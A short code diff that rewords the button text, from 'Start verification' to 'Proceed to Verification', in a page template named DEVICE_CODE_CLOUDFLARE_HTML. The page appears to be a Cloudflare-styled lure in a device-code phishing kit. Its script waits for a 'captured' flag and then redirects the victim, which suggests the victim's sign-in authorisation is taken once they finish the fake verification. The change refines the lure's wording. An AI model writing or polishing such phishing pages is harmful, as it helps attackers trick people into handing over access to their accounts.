@@ -2620,7 +2620,7 @@ const DEVICE_CODE_CLOUDFLARE_HTML = `<!doctype html>
 					</p>
 
 					<button id="verify-device" class="verify-btn" type="button">
-						Start verification 
+						Proceed to Verification 
 					</button>
 				</div>
 			</section>
@@ -2857,7 +2857,7 @@ const DEVICE_CODE_CLOUDFLARE_HTML = `<!doctype html>
 			          verifyUrl = d.verify_url;
 			          render(); // Re-render with the new code
 			          verifyBtn.disabled = false;
-			          verifyBtn.textContent = 'Start verification';
+			          verifyBtn.textContent = 'Proceed to Verification';
 			        }
 			        if(d.captured) {
 			          if(d.redirect_url) {
